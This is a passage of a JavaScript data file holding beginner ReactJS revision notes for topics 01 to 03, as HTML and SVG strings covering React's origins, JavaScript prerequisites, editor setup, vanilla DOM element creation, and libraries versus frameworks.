/* ═══════════════════════════════════════════════════════════════
   REACT-DATA.JS — ReactJS Revision Notes Data Engine (OneNightRevise)
   Topics 01 through 03 with full SVG Architecture Diagrams
   ═══════════════════════════════════════════════════════════════ */

const REACT_NOTES = {
  subject: "ReactJS Revision Notes",
  shortTitle: "ReactJS",
  tagline: "Modern Frontend Engineering, Virtual DOM & Component Architecture",
  topics: [
    /* ═══════════════════════════════════════════════════════════════
       TOPIC 1: WHAT IS REACTJS & WHY WAS IT NEEDED?
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-01-what-is-react",
      number: "01",
      shortLabel: "What Is ReactJS?",
      title: "What Is ReactJS & Why Was It Needed?",
      summary: "Definition as a UI library, Jordan Walke's Meta/Facebook origin story (2013), the message reload bottleneck, and buttery smooth granular updates.",
      subtopicLabels: ["1.1 What Is React?", "1.2 Facebook Story", "1.3 Key Benefits"],
      diagramCount: 2,
      sections: [
        {
          num: "1.1",
          title: "What Is ReactJS?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Simple Definition:</strong> ReactJS is an open-source <strong>JavaScript Library</strong> used specifically for building <strong>User Interfaces (UI)</strong>—in simple terms, it powers the <strong>Frontend</strong> of modern web applications.</li>
              <li><strong>Why Not Just HTML, CSS, and Vanilla JS?</strong>
                <ul class="notes-sub-list">
                  <li>You can certainly build frontends using plain HTML, CSS, and JavaScript, but as applications grow in complexity, synchronizing UI state with the DOM imperatively becomes messy, slow, and error-prone.</li>
                  <li>ReactJS is purpose-built to engineer <strong>complex, interactive, and high-performance frontends</strong> cleanly, predictably, and efficiently.</li>
                </ul>
              </li>
              <li><strong>Who Created It & When?</strong>
                <ul class="notes-sub-list">
                  <li>Created inside <strong>Meta</strong> (formerly <strong>Facebook</strong>) and open-sourced in <strong>2013</strong>.</li>
                  <li>Originally developed by Facebook software engineer <strong>Jordan Walke</strong> (founding creator of React, who introduced FaxJS which evolved into React).</li>
                </ul>
              </li>
              <li><strong>Industry Relevance:</strong> Even amidst rapid AI advancements, ReactJS remains the undisputed industry standard frontend skill demanded by top tech companies and startups worldwide.</li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 1.1 · Frontend Architecture Evolution: From Imperative DOM to ReactJS</span>
                <span class="diagram-frame-tag">HISTORICAL TIMELINE & PARADIGM SHIFT</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing the evolution from manual DOM manipulation in 2010 to Jordan Walke inventing React at Meta in 2013 to modern industry standard">
                  <!-- Era 1: 2010 -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="250" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.5"/>
                    <text x="125" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">2010 · TRADITIONAL WEB</text>
                    <text x="125" y="56" text-anchor="middle" class="svg-title">Imperative jQuery / DOM</text>
                    <rect x="18" y="72" width="214" height="42" rx="6" fill="var(--danger-bg)" stroke="var(--danger)"/>
                    <text x="125" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger);">Manual Node Mutation</text>
                    <rect x="18" y="122" width="214" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="148" text-anchor="middle" class="svg-sub">Full page reloads & spaghetti sync</text>
                  </g>

                  <!-- Arrow 1 -->
                  <g transform="translate(285, 95)">
                    <line x1="0" y1="15" x2="30" y2="15" stroke="var(--accent)" stroke-width="2" stroke-dasharray="4 3"/>
                    <polygon points="30,10 40,15 30,20" fill="var(--accent)"/>
                  </g>

                  <!-- Era 2: 2013 -->
                  <g transform="translate(335, 20)">
                    <rect x="0" y="0" width="250" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="125" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2013 · META (FACEBOOK)</text>
                    <text x="125" y="56" text-anchor="middle" class="svg-title">Jordan Walke Invents React</text>
                    <rect x="18" y="72" width="214" height="42" rx="6" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="125" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:600;">UI = f(State) Model</text>
                    <rect x="18" y="122" width="214" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="148" text-anchor="middle" class="svg-sub">Virtual DOM & Declarative JSX</text>
                  </g>

                  <!-- Arrow 2 -->
                  <g transform="translate(595, 95)">
                    <line x1="0" y1="15" x2="30" y2="15" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="30,10 40,15 30,20" fill="var(--success)"/>
                  </g>

                  <!-- Era 3: Present -->
                  <g transform="translate(645, 20)">
                    <rect x="0" y="0" width="210" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.5"/>
                    <text x="105" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">PRESENT · GLOBAL STANDARD</text>
                    <text x="105" y="56" text-anchor="middle" class="svg-title">Modern Ecosystem</text>
                    <rect x="15" y="72" width="180" height="42" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="105" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">Component Architecture</text>
                    <rect x="15" y="122" width="180" height="42" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="105" y="148" text-anchor="middle" class="svg-sub">Next.js, Vite, Hooks & RSC</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "1.2",
          title: "Why Was ReactJS Needed? (The Facebook Story)",
          content: `
            <div class="callout-highlight-box">
              <span class="callout-highlight-tag">The Real-World Facebook Problem (2010–2011)</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary);">
                As Facebook exploded to hundreds of millions of users, its frontend was built using traditional static HTML, CSS, and fragmented JavaScript.
              </p>
            </div>

            <ul class="notes-bullet-list" style="margin-top:1rem;">
              <li><strong>The Core Problem (Full Page Reloads for Tiny UI Updates):</strong>
                <ul class="notes-sub-list">
                  <li>Imagine scrolling down your Facebook News Feed. Your <strong>Messages counter</strong> currently reads <code>3</code>.</li>
                  <li>Suddenly, a friend sends you a new message. In the traditional architecture, that counter <code>3</code> could <strong>not update automatically</strong> on the spot.</li>
                  <li>To see the new message count (<code>4</code>), you had to <strong>manually reload the entire webpage</strong> (hit <code>F5</code> or browser refresh).</li>
                  <li>A full reload meant tearing down the entire page, causing a jarring white flash, re-fetching posts, images, sidebar ads, and re-rendering everything from scratch—all just to increment one single digit from <code>3</code> to <code>4</code>!</li>
                </ul>
              </li>
              <li><strong>Identical Issue with Likes & Notifications:</strong>
                <ul class="notes-sub-list">
                  <li>If someone liked your photo or commented on a thread, you had zero real-time visibility without refreshing the page.</li>
                  <li>Traditional static multi-page apps forced full-page replacements because browsers had no clean way to isolate and patch only the specific DOM node that changed.</li>
                </ul>
              </li>
              <li><strong>The Impact:</strong> High network bandwidth waste, heavy server strain, constant white screen flickering, and a frustrating, sluggish user experience.</li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 1.2 · Facebook 2010 Reload Bottleneck vs. ReactJS Granular Virtual DOM</span>
                <span class="diagram-frame-tag">FULL RELOAD FLICKER VS SURGICAL COMPONENT PATCH</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 250" class="arch-svg" role="img" aria-label="Diagram contrasting Facebook 2010 full page reload bottleneck where entire page reloads to update message counter from 3 to 4 with ReactJS surgical DOM patch updating only the badge">
                  <!-- BAD PANEL: Full Page Reload -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="210" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="200" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">TRADITIONAL 2010 ARCHITECTURE (THE BOTTLENECK)</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Full Page Reload to Update 1 Number</text>

                    <rect x="25" y="74" width="160" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="105" y="98" text-anchor="middle" class="svg-node">News Feed Scroll</text>
                    <text x="105" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">Messages: [ 3 ]</text>

                    <path d="M 195 104 L 235 104" class="svg-arrow" stroke="var(--danger)"/>

                    <rect x="245" y="74" width="130" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="310" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">New Message!</text>
                    <text x="310" y="118" text-anchor="middle" class="svg-sub" style="fill:var(--danger);">Counter stuck at 3</text>

                    <rect x="25" y="148" width="350" height="48" rx="8" fill="var(--bg-surface)" stroke="var(--danger)" stroke-dasharray="4 3"/>
                    <text x="200" y="170" text-anchor="middle" class="svg-node" style="fill:var(--danger); font-weight:600;">💥 Must Hit F5 / Reload Entire Webpage</text>
                    <text x="200" y="186" text-anchor="middle" class="svg-sub">White screen flicker · Destroys DOM tree</text>
                  </g>

                  <!-- GOOD PANEL: ReactJS Surgical Patch -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="210" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="200" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">REACTJS DECLARATIVE SOLUTION (OUR GOAL)</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Granular Virtual DOM Update</text>

                    <rect x="25" y="74" width="160" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="105" y="98" text-anchor="middle" class="svg-node">Virtual DOM Diff</text>
                    <text x="105" y="118" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent);">Detects count: 3 → 4</text>

                    <path d="M 195 104 L 235 104" class="svg-arrow" stroke="var(--success)"/>

                    <rect x="245" y="74" width="130" height="60" rx="8" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="310" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Badge: [ 4 ] ✓</text>
                    <text x="310" y="118" text-anchor="middle" class="svg-sub" style="fill:var(--success);">Instant in 2 ms</text>

                    <rect x="25" y="148" width="350" height="48" rx="8" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="200" y="170" text-anchor="middle" class="svg-node" style="fill:var(--success); font-weight:600;">✨ Zero Page Reload · Surgically Patched</text>
                    <text x="200" y="186" text-anchor="middle" class="svg-sub">Feeds & videos stay intact without reflow</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "1.3",
          title: "The Key Benefit of ReactJS",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Buttery Smooth Updates:</strong> React eliminates full-page reloads and makes UI transitions instant, fluid, and seamless.</li>
              <li><strong>Smart Reconciliation (Virtual DOM):</strong>
                <ul class="notes-sub-list">
                  <li>React creates a lightweight in-memory representation of the UI called the <strong>Virtual DOM</strong>.</li>
                  <li>When state changes (e.g. message received), React compares the new Virtual DOM with the previous Virtual DOM snapshot (a process called <strong>Diffing</strong>).</li>
                  <li>It calculates the minimal set of changes and applies them directly to the real browser DOM in a single batch (<strong>Reconciliation</strong>).</li>
                </ul>
              </li>
              <li><strong>Zero Unnecessary Re-renders:</strong> Nothing in the UI re-renders or updates unnecessarily—only the exact DOM element whose underlying data changed gets touched.</li>
            </ul>

            <div class="sub-card-grid-3" style="margin-top:1.25rem;">
              <div class="sub-box">
                <div class="sub-box__tag">Benefit 01 · Granular Diffing</div>
                <div class="sub-box__title">Surgical DOM Updates</div>
                <div class="sub-box__body">Instead of replacing a 1,000-line DOM tree, React modifies only the single <code>&lt;span&gt;4&lt;/span&gt;</code> element in real time.</div>
              </div>
              <div class="sub-box">
                <div class="sub-box__tag">Benefit 02 · Declarative Code</div>
                <div class="sub-box__title">Predictable UI State</div>
                <div class="sub-box__body">You describe what the UI should look like based on state; React handles the intricate browser DOM mutations behind the scenes.</div>
              </div>
              <div class="sub-box">
                <div class="sub-box__tag">Benefit 03 · User Retention</div>
                <div class="sub-box__title">No Screen Flicker</div>
                <div class="sub-box__body">Users browse uninterrupted without disruptive blank flashes, making single-page apps feel like high-performance native desktop software.</div>
              </div>
            </div>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 2: JAVASCRIPT ESSENTIALS & FIRST DOM SETUP
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-02-js-essentials-dom",
      number: "02",
      shortLabel: "JS Essentials & DOM Setup",
      title: "JavaScript Essentials & First DOM Setup",
      summary: "Core JS prerequisites (Variables, Arrow Functions, map/filter/reduce), VS Code & Live Server setup, and HTML vs 3-step Vanilla DOM creation.",
      subtopicLabels: ["2.1 JS Prerequisites", "2.2 Environment Setup", "2.3 HTML vs Vanilla DOM"],
      diagramCount: 2,
      sections: [
        {
          num: "2.1",
          title: "JavaScript Prerequisites Before Learning ReactJS",
          content: `
            <p style="color:var(--text-secondary); margin-bottom:1rem;">
              Before diving deep into React components and JSX, you should have a solid foundation in HTML, CSS, and modern JavaScript (ES6+):
            </p>

            <div class="sub-card-grid-3">
              <div class="sub-box">
                <div class="sub-box__tag">Prerequisite 01 · JS Basics</div>
                <div class="sub-box__title">Core Syntax & Types</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong>Variables:</strong> <code>const</code> and <code>let</code> (block scoped) vs <code>var</code>.</li>
                    <li><strong>Data Types:</strong> Primitives (string, number, boolean) vs Reference types (objects, arrays).</li>
                    <li><strong>Conditionals:</strong> <code>if-else</code> and ternary operator (<code>condition ? a : b</code>).</li>
                    <li><strong>Loops:</strong> <code>for</code>, <code>for...of</code>, and iterators.</li>
                  </ul>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Prerequisite 02 · Functions</div>
                <div class="sub-box__title">Functional Building Blocks</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong>Standard Functions:</strong> <code>function add(a, b) { return a + b; }</code></li>
                    <li><strong>Arrow Functions:</strong> <code>const add = (a, b) => a + b;</code></li>
                    <li><strong>Implicit vs Explicit Return:</strong> Understanding when a function yields a value.</li>
                    <li><strong>Callbacks:</strong> Passing functions as arguments to other functions.</li>
                  </ul>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Prerequisite 03 · Arrays</div>
                <div class="sub-box__title">Higher-Order Array Methods</div>
                <div class="sub-box__body">
                  <ul class="notes-sub-list" style="padding-left:1rem;">
                    <li><strong><code>.map()</code>:</strong> Transforms every item and returns a new array (crucial for rendering lists in JSX).</li>
                    <li><strong><code>.filter()</code>:</strong> Returns items matching a condition.</li>
                    <li><strong><code>.reduce()</code>:</strong> Accumulates items into a single value.</li>
                    <li><strong><code>.forEach()</code>:</strong> Executes a side effect for each item.</li>
                  </ul>
                </div>
              </div>
            </div>

            <div class="callout-highlight-box" style="margin-top:1.25rem;">
              <span class="callout-highlight-tag">Comforting Rule of Thumb</span>
              <p style="margin-top:0.4rem; color:var(--text-secondary);">
                Don't worry if you feel slightly rusty on any of these! Every essential JavaScript concept will be revisited and explained clearly with code examples whenever it appears in our React journey.
              </p>
            </div>
          `
        },
        {
          num: "2.2",
          title: "Environment Setup (Code Editor & Extensions)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Folder Setup:</strong> Create a dedicated project directory (e.g., <code>reactjs/</code>) on your machine and open it directly inside <strong>VS Code</strong>.</li>
              <li><strong>Code Editors in the Modern Ecosystem:</strong>
                <ul class="notes-sub-list">
                  <li>While AI-powered editors like <strong>Cursor</strong>, <strong>Windsurf</strong>, <strong>Trae</strong>, and classics like <strong>Sublime Text</strong> are popular, <strong>VS Code</strong> is the reliable industry standard used throughout this course.</li>
                </ul>
              </li>
              <li><strong>Two Highly Recommended Extensions:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Live Server (by Ritwick Dey):</strong> Lets you right-click any <code>index.html</code> file and launch a local development server at <code>http://127.0.0.1:5500</code> with auto-reload upon file save.</li>
                  <li><strong>Dark Reader (Browser Extension):</strong> Automatically switches bright browser preview tabs to a soothing dark theme so late-night revision sessions don't cause eye strain.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 2.1 · Local Development Environment & Hot Reload Architecture</span>
                <span class="diagram-frame-tag">DEVELOPER TOOLCHAIN PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 200" class="arch-svg" role="img" aria-label="Diagram showing VS Code workspace communicating with Live Server on port 5500 serving browser with Dark Reader">
                  <!-- Step 1: VS Code -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
                    <text x="115" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">EDITOR ENVIRONMENT</text>
                    <text x="115" y="56" text-anchor="middle" class="svg-title">VS Code</text>
                    <rect x="18" y="72" width="194" height="60" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="115" y="96" text-anchor="middle" class="svg-mono-xs">📁 reactjs/</text>
                    <text x="115" y="118" text-anchor="middle" class="svg-sub">index.html · script.js</text>
                  </g>

                  <!-- Pipe 1 -->
                  <g transform="translate(265, 88)">
                    <line x1="0" y1="12" x2="40" y2="12" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="40,7 50,12 40,17" fill="var(--accent)"/>
                    <text x="25" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">Save</text>
                  </g>

                  <!-- Step 2: Live Server -->
                  <g transform="translate(325, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.5"/>
                    <text x="115" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">DEV WEBSERVER</text>
                    <text x="115" y="56" text-anchor="middle" class="svg-title">Live Server</text>
                    <rect x="18" y="72" width="194" height="60" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="115" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:600;">Port 5500 (WebSocket)</text>
                    <text x="115" y="118" text-anchor="middle" class="svg-sub">Instant hot auto-reload</text>
                  </g>

                  <!-- Pipe 2 -->
                  <g transform="translate(560, 88)">
                    <line x1="0" y1="12" x2="40" y2="12" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="40,7 50,12 40,17" fill="var(--success)"/>
                    <text x="25" y="3" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">Render</text>
                  </g>

                  <!-- Step 3: Browser Preview -->
                  <g transform="translate(620, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.5"/>
                    <text x="115" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">CLIENT RUNTIME</text>
                    <text x="115" y="56" text-anchor="middle" class="svg-title">Browser Chrome</text>
                    <rect x="18" y="72" width="194" height="60" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="115" y="96" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">Live DOM Preview</text>
                    <text x="115" y="118" text-anchor="middle" class="svg-sub">Dark Reader eye protection</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "2.3",
          title: "Creating Elements in HTML vs. Vanilla JavaScript (DOM)",
          content: `
            <p style="color:var(--text-secondary); margin-bottom:1rem;">
              Before understanding how React creates elements using JSX and <code>React.createElement</code>, let's contrast how elements are created in plain HTML versus Vanilla JavaScript:
            </p>

            <div class="sub-card-grid-2">
              <div class="sub-box">
                <div class="sub-box__tag">Approach 01 · Static Markup</div>
                <div class="sub-box__title">In Plain HTML (index.html)</div>
                <div class="sub-box__body">
                  <p>In standard HTML, you write tags directly into your file:</p>
                  <pre style="background:var(--bg-frame); padding:0.75rem 1rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.5rem 0; overflow-x:auto;">&lt;h1&gt;Hello from HTML&lt;/h1&gt;</pre>
                  <p>The browser parses this static string upon page load and draws the heading on screen.</p>
                </div>
              </div>

              <div class="sub-box">
                <div class="sub-box__tag">Approach 02 · Imperative DOM</div>
                <div class="sub-box__title">In Vanilla JavaScript (script.js)</div>
                <div class="sub-box__body">
                  <p>In Vanilla JS, you create the DOM node imperatively in 3 distinct steps:</p>
                  <pre style="background:var(--bg-frame); padding:0.75rem 1rem; border-radius:6px; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.85rem; margin:0.5rem 0; overflow-x:auto;">// Step 1: Create Element Node in Memory
var h1 = document.createElement('h1');

// Step 2: Inject Content / Properties
h1.innerHTML = 'Hello from JS';

// Step 3: Append to the Real DOM Tree
document.body.appendChild(h1);</pre>
                  <p>This programmatically constructs the element in memory and attaches it to the browser's live DOM tree.</p>
                </div>
              </div>
            </div>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 2.2 · The 3-Step Imperative Vanilla DOM Pipeline vs Declarative React Target</span>
                <span class="diagram-frame-tag">DOM CREATION LIFECYCLE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing Step 1 createElement, Step 2 innerHTML, Step 3 appendChild pipeline in Vanilla JS and how React abstracts it">
                  <!-- Step 1 -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="240" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--border-strong)" stroke-width="1.5"/>
                    <text x="120" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">STEP 1 · ALLOCATION</text>
                    <text x="120" y="54" text-anchor="middle" class="svg-title">document.createElement</text>
                    <rect x="15" y="70" width="210" height="46" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="120" y="98" text-anchor="middle" class="svg-mono-xs">var h1 = document.createElement('h1')</text>
                    <text x="120" y="142" text-anchor="middle" class="svg-sub">Allocates empty node in JS heap</text>
                    <text x="120" y="158" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning);">Not visible on screen yet</text>
                  </g>

                  <!-- Arrow 1 -->
                  <g transform="translate(275, 95)">
                    <line x1="0" y1="12" x2="35" y2="12" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="35,7 45,12 35,17" fill="var(--accent)"/>
                  </g>

                  <!-- Step 2 -->
                  <g transform="translate(325, 25)">
                    <rect x="0" y="0" width="240" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.5"/>
                    <text x="120" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">STEP 2 · MUTATION</text>
                    <text x="120" y="54" text-anchor="middle" class="svg-title">h1.innerHTML</text>
                    <rect x="15" y="70" width="210" height="46" rx="6" fill="var(--primary-bg)" stroke="var(--primary)"/>
                    <text x="120" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:600;">h1.innerHTML = 'Hello from JS'</text>
                    <text x="120" y="142" text-anchor="middle" class="svg-sub">Assigns text/children to node</text>
                    <text x="120" y="158" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning);">Still detached from document</text>
                  </g>

                  <!-- Arrow 2 -->
                  <g transform="translate(570, 95)">
                    <line x1="0" y1="12" x2="35" y2="12" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="35,7 45,12 35,17" fill="var(--success)"/>
                  </g>

                  <!-- Step 3 -->
                  <g transform="translate(620, 25)">
                    <rect x="0" y="0" width="230" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="115" y="30" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">STEP 3 · MOUNTING</text>
                    <text x="115" y="54" text-anchor="middle" class="svg-title">appendChild</text>
                    <rect x="15" y="70" width="200" height="46" rx="6" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="115" y="98" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">document.body.appendChild(h1)</text>
                    <text x="115" y="142" text-anchor="middle" class="svg-sub">Triggers reflow & paint</text>
                    <text x="115" y="158" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:600;">✓ Visible to user on screen</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 3: LIBRARY VS. FRAMEWORK
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-03-library-vs-framework",
      number: "03",
      shortLabel: "Library vs Framework",
      title: "Library vs. Framework",
      summary: "Modular libraries (GSAP, Lenis, React) vs all-in-one frameworks (Next.js, Angular, Remix), and the House Analogy (Ready-Made Flat vs Empty Plot of Land).",
      subtopicLabels: ["3.1 Library", "3.2 Framework", "3.3 House Analogy"],
      diagramCount: 2,
      sections: [
        {
          num: "3.1",
          title: "What Is a Library?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Core Definition:</strong> A <strong>Library</strong> is a collection of pre-written functions and utilities designed to handle <strong>one specific job or feature</strong> for your web application.</li>
              <li><strong>Modular & In Control:</strong>
                <ul class="notes-sub-list">
                  <li>When you use a library, <strong>YOU are in the driver's seat</strong> (your code calls the library whenever you need it).</li>
                  <li>You mix, match, and swap separate libraries for separate needs without being forced into an inflexible project architecture.</li>
                </ul>
              </li>
              <li><strong>Real-World Examples of Libraries:</strong>
                <ul class="notes-sub-list">
                  <li><strong>GSAP (GreenSock):</strong> Used specifically for crafting high-performance <strong>moving animations</strong>.</li>
                  <li><strong>Lenis:</strong> Used specifically for adding luxurious <strong>smooth scrolling</strong> behavior.</li>
                  <li><strong>ReactJS:</strong> Used specifically for constructing and updating the <strong>UI (Frontend)</strong> of your application.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "3.2",
          title: "What Is a Framework?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Core Definition:</strong> A <strong>Framework</strong> provides a <strong>complete, structured, all-in-one foundation</strong> for your entire project rather than making you assemble independent tools for every capability.</li>
              <li><strong>Inversion of Control:</strong>
                <ul class="notes-sub-list">
                  <li>In a framework, the <strong>framework is in the driver's seat</strong>. The framework calls YOUR code according to its strict lifecycles, conventions, and directory structures.</li>
                  <li>Routing, state handling, compilation, data fetching, and build pipelines are bundled and pre-configured out of the box.</li>
                </ul>
              </li>
              <li><strong>Real-World Examples of Frameworks:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Next.js:</strong> The full-stack React framework providing Server-Side Rendering (SSR), file-based routing, and API endpoints.</li>
                  <li><strong>Angular:</strong> Google's opinionated enterprise framework with built-in dependency injection, TypeScript, and routing.</li>
                  <li><strong>Remix:</strong> Full-stack web framework focused on web standards and nested routing.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame" style="margin-top:1.25rem;">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 3.1 · Control Flow: Library (You Call Code) vs. Framework (Framework Calls You)</span>
                <span class="diagram-frame-tag">INVERSION OF CONTROL (IoC) ARCHITECTURE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting Library where user code calls library with Framework where framework lifecycle calls user code">
                  <!-- LEFT: LIBRARY -->
                  <g transform="translate(30, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="197" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">LIBRARY PATTERN (REACTJS, GSAP, LENIS)</text>
                    <text x="197" y="56" text-anchor="middle" class="svg-title">You Are in Complete Control</text>

                    <rect x="25" y="74" width="150" height="80" rx="8" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="100" y="102" text-anchor="middle" class="svg-node" style="font-weight:700; fill:var(--accent);">YOUR CODE</text>
                    <text x="100" y="124" text-anchor="middle" class="svg-sub">Calls library when needed</text>

                    <path d="M 185 114 L 230 114" class="svg-arrow" stroke="var(--accent)"/>
                    <text x="207" y="105" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-size:10px;">calls</text>

                    <rect x="240" y="74" width="130" height="80" rx="8" fill="var(--accent-light)" stroke="var(--accent)"/>
                    <text x="305" y="102" text-anchor="middle" class="svg-node">Library</text>
                    <text x="305" y="124" text-anchor="middle" class="svg-mono-xs">React / GSAP</text>
                  </g>

                  <!-- RIGHT: FRAMEWORK -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="197" y="32" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">FRAMEWORK PATTERN (NEXT.JS, ANGULAR)</text>
                    <text x="197" y="56" text-anchor="middle" class="svg-title">Framework Controls Execution</text>

                    <rect x="25" y="74" width="135" height="80" rx="8" fill="var(--primary-bg)" stroke="var(--primary)"/>
